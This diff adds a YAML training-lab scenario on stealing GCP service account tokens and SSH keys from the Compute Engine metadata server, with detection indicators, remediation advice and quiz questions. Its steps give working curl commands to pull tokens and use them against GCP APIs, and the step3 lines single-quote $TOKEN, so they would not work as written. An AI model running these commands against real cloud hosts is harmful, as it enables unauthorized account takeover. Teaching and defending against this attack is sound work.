@@ -1,0 +1,108 @@
+# Category: Cloud Security - GCP
+name: "GCP Compute Engine Metadata Service Exploitation"
+id: "cloud-gcp-metadata-001"
+category: "cloud_security"
+subcategory: "gcp"
+difficulty: "intermediate"
+estimated_time: "50 minutes"
+
+description: |
+  Exploit the GCP Compute Engine metadata server (169.254.169.254) to steal
+  service account access tokens, SSH keys, and project metadata. Similar to
+  AWS IMDS, this attack is often performed via SSRF or command injection on
+  a VM. GCP's metadata server exposes both v1 and v1beta1 endpoints.
+
+learning_objectives:
+  - Understand GCP metadata server structure
+  - Enumerate metadata from a compromised VM
+  - Extract service account access tokens
+  - Use tokens to interact with GCP APIs
+
+tools:
+  - curl
+  - jq
+  - gcloud
+  - python
+
+prerequisites:
+  - SSRF vulnerability or shell access to a Compute Engine VM
+  - The VM must have a service account attached
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Access metadata server and enumerate endpoints"
+    commands:
+      - "# Query the metadata root"
+      - "curl -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/"
+      - "# List project and instance attributes"
+      - "curl -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/project/"
+      - "# Check OS login SSH keys"
+      - "curl -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/attributes/ssh-keys"
+    expected_output: "Metadata structure, project ID, zone, and custom attributes"
+    detection: "Metadata server access logs (if enabled) – internal IPs to 169.254.169.254"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Extract service account access token"
+    commands:
+      - "# Get default service account token"
+      - "curl -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
+      - "# Or use v1beta1 for full scope"
+      - "curl -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1beta1/instance/service-accounts/default/token?scopes=https://www.googleapis.com/auth/cloud-platform"
+      - "# Parse token with jq"
+      - "curl -s -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token | jq -r .access_token"
+    expected_output: "OAuth2 access token with cloud‑platform scope"
+    detection: "Metadata server requests from application layer (SSRF patterns)"
+
+  - id: "step3"
+    phase: "post_exploitation"
+    action: "Use token to access other GCP resources"
+    commands:
+      - "# Set token in gcloud"
+      - "export TOKEN=$(curl -s -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token | jq -r .access_token)"
+      - "# List compute instances across zones"
+      - "curl -H 'Authorization: Bearer $TOKEN' https://compute.googleapis.com/compute/v1/projects/<PROJECT>/aggregated/instances"
+      - "# List storage buckets"
+      - "curl -H 'Authorization: Bearer $TOKEN' https://storage.googleapis.com/storage/v1/b?project=<PROJECT>"
+    expected_output: "Access to GCP resources with the VM's service account permissions"
+    detection: "API calls from non‑VM IPs using metadata token; Cloud Audit Logs"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1552.005"
+    description: "Cloud Instance Metadata API"
+  - standard: "CIS GCP Foundations"
+    control: "4.1"
+    description: "Ensure that instances do not have public IP addresses if not required"
+
+detection:
+  network_indicators:
+    - "HTTP requests to 169.254.169.254 from app servers"
+    - "SSRF payloads with 'Metadata-Flavor: Google' header"
+  log_indicators:
+    - "Cloud Audit Logs: API calls using tokens from metadata (verify IP)"
+  endpoint_indicators:
+    - "curl or wget accessing metadata endpoint"
+
+remediation:
+  immediate:
+    - "Use VPC Service Controls to restrict API calls from metadata tokens"
+    - "Assign minimal-scope service accounts to VMs"
+  long_term:
+    - "Enable OS Login with IAM to reduce SSH key exposure"
+    - "Monitor metadata access in application logs"
+
+variables:
+  project_id: "my-gcp-project"
+
+assessment_questions:
+  - "What is the difference between GCP metadata v1 and v1beta1?"
+  - "How can you restrict the scope of a service account attached to a VM?"
+  - "Why is the metadata server a high‑value target?"
+
+references:
+  - url: "https://cloud.google.com/compute/docs/metadata/overview"
+    title: "GCP Metadata Server"
+  - url: "https://hackerone.com/reports/1103565"
+    title: "SSRF to GCP Metadata – real report"
